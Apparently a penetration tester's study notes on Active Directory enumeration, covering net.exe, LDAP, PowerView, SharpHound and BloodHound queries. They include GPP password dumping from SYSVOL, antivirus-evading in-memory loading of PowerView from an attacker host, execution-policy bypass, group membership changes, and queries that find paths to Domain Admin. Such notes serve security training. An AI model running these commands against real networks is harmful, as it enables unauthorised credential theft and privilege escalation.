## Manual Enumeration

#### Query Users with Net.exe
###### Find list of Domain users when authenticated
`net user /domain`
###### Query Specific User
`net user jeffadmin /domain`
This will return Group information and whether the account is active, etc.
###### Enumerate Domain Users
`net groups /domain`
###### Enumerate Domain Users Within a Group
`net group "Sales Department" /domain`
###### Add User to Group
`net group "Management Department" stephanie /add /domain`
###### Remove User from Group
`net group "Management Department" stephanie /del /domain`
#### LDAP Enumeration
###### Example LDAP Path Format
`LDAP://HostName[:PortNumber][/DistinguishedName]`
**Note:** The port number is optional. It will automatically select it unless a custom port is being used.
###### Example of a Distinguished Name (DN)
`CN=Stephanie,CN=Users,DC=corp,DC=com`
###### Get Current Domain (PowerShell)
`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
**Note:** Reveals PdcRoleOwner (Primary DC Role Owner).
###### Get COM Interface For DN
`([adsi]'').distinguishedName`
### Misc.
###### Check Logged On Users
`.\PSLoggedon.exe \\Desktop-04`
**Note:** Requires Remote Registry Service
###### Find Service Principal Name Linked to User
`setspn -L <username>`
[[2.3.2 Further Attacks#Kerberoasting|Exploitation]]
###### Dump GPP Passwords With Domain Access
`Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies" -Recurse -Include *.xml | Select-String -Pattern "cpassword"`
[[2.3.3 Miscellaneous Attacks#Crack GPP Passwords|Exploitation]]


---
## Enumeration with PowerView
[Github - PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1)
###### Import to Memory
`powershell -ep bypass`
`Import-Module .\PowerView.ps1`
###### Load in-memory without writing to disk (AV Avoidance)
`$PowerViewUrl = "http://<attack-ip>/PowerView.ps1"`
`$script = (New-Object System.Net.WebClient).DownloadString($PowerViewURL)`
`$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)`
`$encoded = [Convert]::ToBase64String($bytes)`
`Write-Output $encoded`
**Note:** Carry out the above on Attack machine and the below on the target system
`$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("<PASTE_BASE64_HERE>"))`
`Invoke-Expression $decoded`

---
#### Users and Groups
###### Basic Domain Info
`Get-NetDomain`
###### List All Users in Domain
`Get-NetUser`
###### Usernames only
`Get-NetUser | select cn` - pipes out just the usernames only
###### Users and specific criteria
`Get-NetUser | select cn,pwdlastset,lastlogon`
`Get-NetUser | select cn,memberof,whencreated`
###### Get Info for Specific User
`Get-NetUser jeff`
###### List All Groups
`Get-NetGroup | select cn`
###### List Users in Specific Group
`Get-NetGroup "Administrators" | select member`


---
#### Permissions and Logged On Users
###### Check Currently Logged in User Admin Permissions Across Domain
`Find-LocalAdminAccess`
###### Check Users Logged Into Machine
`Get-NetSession -ComputerName Desktop-04`
**Note:** Will not work on Windows 11
###### Check Users Logged Into Machine Verbose for Errors
`Get-NetSession -ComputerName fileso4 -Verbose`
**Note:** Check the IPs for this to ensure it's not in error.
###### Check Registry File Permissions
`Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl`
###### Check for Do not require Kerberos Pre-authentication
`Get-DomainUser -PreauthNotRequired`
[[2.3.2 Further Attacks#AS-REP Roasting|Exploitation]]
###### Dump GPP Passwords
`Get-GPPPassword`
[[2.3.3 Miscellaneous Attacks#Crack GPP Passwords|Exploitation]]

---
#### Enumerate Object Permissions
###### Get ACL for User
`Get-ObjectAcl -Identity <user>`
**Note:** We are mainly interested in the SIDs and the ActiveDirectoryRights.
[[2.3.3 Miscellaneous Attacks#Incorrect ACL Permissions|Exploitation]]
###### Convert SID
`Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-519`
**Note:** Use this on the SecurityIdentifier values.
###### Filter For GenericAll Rights (Highest Rights)
`Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
**Note:** This will tell you which users have GenericAll rights over the object
[[2.3.3 Miscellaneous Attacks#GenericAll Exploitation|Exploitation]]
###### Pipe Multiple SIDs to Convert
`"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName`

---
### Misc.
###### Finding Domain Shares
`Find-DomainShare`
###### Check we have access
`Find-DomainShare -CheckShareAccess`
**Note:** If you have access, you can just list out the share like `ls "\\Server04\Secret Folder\"`
###### View Service Principal Names Linked to User
`Get-NetUser -SPN | select samaccountname,serviceprincipalname`
**Note:** This can make the accounts vulnerable to kerberoasting.
[[2.3.2 Further Attacks#Kerberoasting|Exploitation]]
###### Get Operating Systems
`Get-NetComputer`
`Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname`


---

## Automated Enumeration
#### Sharphound and BloodHound
##### Set Up BloodHound
###### Get docker-compose
`wget https://github.com/docker/compose/releases/download/v2.32.1/docker-compose-linux-aarch64`
`chmod +x ./docker-compose-linux-aarch64`
`cp ./docker-compose-linux-aarch64 /usr/bin/`
###### Download and Run BloodHound Installation in Docker
`curl -L https://ghst.ly/getbhce | docker-compose up`
**Note:** Record the password that is shown in the logs. Navigate to http://localhost:8080 . The Username is admin.
**Note:** Get the matching version of SharpHound.ps1 from this BloodHound instance or it won't be compatible.
###### Run BloodHound from Existing Docker
`docker-compose up -d`
**Note:** This will have to be from the same folder where the docker-compose.yml file that was created at initial Download currently resides.
###### Start BloodHound from Scratch
`docker-compose down -v`
`docker-compose up -d`
##### Gather the data with SharpHound.ps1
###### Transfer SharpHound.ps1 to target
[[0.6 File Transfer|File Transfer]]
###### Set Execution Policy
`powershell -ep bypass`
###### Import SharpHound .ps1
`Import-Module .\Sharphound.ps1`
###### Invoke BloodHound
`Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\ -OutputPrefix "client-name"`
###### Transfer File to Attack Machine
[[0.6 File Transfer|File Transfer]]
###### Import to BloodHound
Import the .zip file (or extracted JSON files) into the BloodHound instance. It will automatically digest them.
##### Run Queries
###### Identify all computers
`MATCH (m:Computer) RETURN m`
###### Identify all users
`MATCH (m:User) RETURN m`
###### Passwords stored in description of account
`MATCH (u:User) WHERE u.description CONTAINS "password"`
###### Identify all active sessions
`MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`
###### Computers where Domain Users can RDP
```
MATCH (g:Group)-[:MemberOf*1..]->(target:Group)
WHERE g.name = "Domain Users" AND target.name CONTAINS "Remote Desktop Users"
WITH target
MATCH (c:Computer)-[:CanRDP]->(target)
RETURN c
```
###### Computers where Everyone can RDP
`MATCH (c:Computer)-[:CanRDP]->(g:Group) WHERE g.name = "Everyone" RETURN c`
###### Computers where Domain Users have Local Admin rights
```
MATCH (g:Group)-[:MemberOf*1..]->(target:Group)
WHERE g.name = "Domain Users" AND target.name CONTAINS "Administrators"
WITH target
MATCH (c:Computer)-[:AdminTo]->(target)
RETURN c
```
###### Find Kereroastable accounts
`MATCH (u:User) WHERE u.hasspn = TRUE RETURN u`
**Note:** This already exists as a prebuilt query.
[[2.3.2 Further Attacks#Kerberoasting|Exploitation]]
###### Find Computers with Unconstrained Delegation Enabled
`MATCH (c:Computer) WHERE c.unconstraineddelegation = TRUE RETURN c`
**Note:** If a privileged user (e.g., Domain Admin) logs into a machine with unconstrained delegation enabled, their TGT (Ticket Granting Ticket) gets stored there.
[[2.3.3 Miscellaneous Attacks#Unconstrained Delegation Exploitation|Exploitation]]
###### Find Principals with DCSync Rights
`MATCH (n)-[r:GetChanges|GetChangesAll|GetChangesInFilteredSet]->(m) RETURN n, r, m`
**Note:** This is a prebuilt query.
[[2.3.2 Further Attacks#Domain Controller Synchronisation|Exploitation]]
###### Shortest path to Domain Admin from Owned Principals
```
MATCH p=shortestPath((n:Base)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|Contains|GPLink|AllowedToDelegate|CoerceToTGT|TrustedBy|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|DCFor|SyncedToEntraUser*1..]->(g:Group))
WHERE g.objectid ENDS WITH '-512' AND n<>g AND 'owned' IN split(n.system_tags,' ')
RETURN p
LIMIT 1000
```
**Note:** Every time we gain ownership of something (user account, local admin on a computer, etc.) we should mark it as Owned to help with this function.